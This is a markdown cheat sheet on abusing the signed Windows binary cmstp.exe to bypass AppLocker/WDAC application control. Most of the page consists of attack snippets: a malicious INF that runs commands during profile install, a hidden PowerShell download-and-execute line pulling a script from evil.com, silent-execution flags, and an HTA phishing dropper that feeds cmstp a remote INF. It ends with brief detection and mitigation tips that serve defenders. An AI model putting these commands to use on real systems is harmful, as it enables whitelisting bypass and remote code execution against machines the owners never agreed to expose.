# 🛠️ CMSTP - Living Off the Land

**cmstp.exe** is a signed Windows binary used to install Connection Manager service profiles via INF files. Attackers abuse it to **execute arbitrary commands** during the profile install process — effectively bypassing application whitelisting (AppLocker/WDAC).

> ⚠️ CMSTP is trusted by Windows, signed by Microsoft, and abused in real-world malware and red team operations.

---

## 🛠️ What It Does
- Installs `.inf` configuration files for dial-up and VPN profiles
- Runs embedded commands defined in the INF
- Can silently bypass application control policies
- Executes code as the user or elevated (with prompt)

---

## 💣 Common LotL CMSTP Techniques

### 1. Execute Malicious Command from INF
**malicious.inf**:
```ini
[version]
Signature=$CHICAGO$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunMe

[RunMe]
"cmd.exe /c calc.exe"
```
Run with:
```cmd
cmstp.exe /s malicious.inf
```
✅ Runs `calc.exe` or any command silently as part of install — bypasses AppLocker

---

### 2. Execute Payload Download and Run
```ini
[RunMe]
"powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
```
✅ Turns CMSTP into a remote payload launcher

---

### 3. Evade Controls with Trusted Binary
```cmd
cmstp.exe /ni /s malicious.inf
```
✅ `/ni` = no interface; `/s` = silent — no user interaction

---

### 4. Deliver via Phishing or HTA Dropper
```html
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmstp.exe /s http://evil.com/payload.inf", 0, true);
</script>
```
✅ HTA drops INF and uses CMSTP to execute — common in phishing campaigns

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| CMSTP calling PowerShell, cmd, or remote URLs | Monitor for `RunPreSetupCommands` abuse |
| CMSTP invoked in user context | Rare in legitimate environments — investigate all usage |
| `.inf` in non-Windows directories | Flag dropped files outside expected config folders

---

## 🔐 Mitigation Strategies
- Block `cmstp.exe` if unused in your org with AppLocker/WDAC
- Monitor for `.inf` files created or executed from `Downloads`, `%TEMP%`, `Public`
- Hunt for PowerShell commands executed by `cmstp.exe`
- Alert on execution of unsigned or unknown `.inf` files

---

> 🧠 CMSTP is powerful and still effective. A perfect example of Living off the Land bypassing even advanced defenses — often paired with HTA, MS Word macros, or VBS droppers in phishing chains.
